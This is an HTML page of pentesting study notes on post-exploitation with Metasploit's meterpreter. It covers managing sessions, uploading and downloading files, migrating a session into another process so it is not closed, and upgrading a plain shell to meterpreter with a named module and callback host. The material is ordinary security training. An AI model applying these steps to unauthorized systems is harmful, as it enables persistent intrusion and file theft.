<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="gandhi-taha">
    
    <link rel="shortcut icon" href="../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Meterpreter for Post-exploitation - Notes</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Meterpreter shell for post-exploitation", url: "#_top", children: [
              {title: "Basics", url: "#basics" },
              {title: "Scripts", url: "#scripts" },
              {title: "Post modules", url: "#post-modules" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../privilege_escalation_-_linux/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../privilege_escalation_-_linux/" class="btn btn-xs btn-link">
        Local Privilege Escalation - Linux
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../spawning_shells/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../spawning_shells/" class="btn btn-xs btn-link">
        Spawning Shells
      </a>
    </div>
    
  </div>

    

    <h1 id="meterpreter-shell-for-post-exploitation">Meterpreter shell for post-exploitation<a class="headerlink" href="#meterpreter-shell-for-post-exploitation" title="Permanent link">#</a></h1>
<p>By now you probably has some kind of shell to the target. If it is not a meterpreter shell you should probably try to turn the current shell into a meterpreter shell, since it gives you a lot of tools available really easy.</p>
<p>So just create a meterpreter-shell from msfvenom or something like that. Maybe a php-shell. Or whatever you have access to. Then you just fire that script and get your meterpreter shell. Check out the chapter Exploiting/Msfvenom for more about creating payloads.</p>
<h2 id="basics">Basics<a class="headerlink" href="#basics" title="Permanent link">#</a></h2>
<p>List all commands</p>
<pre><code>help
</code></pre>

<p>Get help about a specific command</p>
<pre><code>help upload
</code></pre>

<h3 id="sessions">Sessions<a class="headerlink" href="#sessions" title="Permanent link">#</a></h3>
<p>So first some basics. You can put the shell into a background job with the command <code>background</code>. This might be useful if you have several shells going at the same time. Or if you want to move to a specific directory to upload or download some files.</p>
<p>List background sessions</p>
<pre><code>background -l
</code></pre>

<p>Connect back to a background session</p>
<pre><code>background -i 1
</code></pre>

<p>Upload and download files.</p>
<pre><code>upload
download
</code></pre>

<h2 id="scripts">Scripts<a class="headerlink" href="#scripts" title="Permanent link">#</a></h2>
<h3 id="migrate">Migrate<a class="headerlink" href="#migrate" title="Permanent link">#</a></h3>
<p>A really common and useful script that is build into metasploit is the migrate script. If you get the shell through some kind of exploits that crashes a program the user might shut down that program and it will close your session. So you need to migrate your session to another process. You can do that with the <code>migrate</code> script.</p>
<p>First run this command to output all processes</p>
<pre><code>ps
</code></pre>

<p>Now you choose one and run</p>
<pre><code>run migrate -p 1327
</code></pre>

<p>Where the <code>-p</code> is the PID of the process.</p>
<h2 id="post-modules">Post modules<a class="headerlink" href="#post-modules" title="Permanent link">#</a></h2>
<p>There are tons of modules specifically created for post-exploitation. They can be found with</p>
<pre><code>use post/
</code></pre>

<h3 id="upgrade-a-normal-shell-to-metepreter">Upgrade a normal shell to metepreter<a class="headerlink" href="#upgrade-a-normal-shell-to-metepreter" title="Permanent link">#</a></h3>
<p>There is a point in doing stuff through metasploit. For example, if you find a exploit that does not have meterpreter available as a payload you can just start a normal shell and then upgrade it. To do that you do the following:</p>
<p>First you generate a shell through metasploit, either through a specici exploit or through a msfvenom-shell that you upload. Now that you have a normal shell it is time to upgrade it to a meterpreter shell.</p>
<p>First we have to leave the shell but without killing it. So we do</p>
<pre><code>Ctr-z
Background session 2? [y/N]  y
</code></pre>

<p>Now we have that shell running in the background, and you can see it with </p>
<pre><code>show sessions
#or
sessions -l
</code></pre>

<p>And you can connect to it again with</p>
<pre><code>sessions -i 1
</code></pre>

<p>Or whatever the number of the session is.</p>
<p>So now we have the shell running in the background. It is time to upgrade</p>
<pre><code>use post/multi/manage/shell_to_meterpreter
set LHOST 192.168.1.102
set session 1
exploit
</code></pre>

<p>Now metasploit will create a new session with meterpeter that will be available to you.</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../privilege_escalation_-_linux/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../privilege_escalation_-_linux/" class="btn btn-xs btn-link">
        Local Privilege Escalation - Linux
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../spawning_shells/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../spawning_shells/" class="btn btn-xs btn-link">
        Spawning Shells
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
      <p>
        <a href="https://github.com/gandhi-taha/edit/master/docs/post_exploitation/getting_meterpreter_shell.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>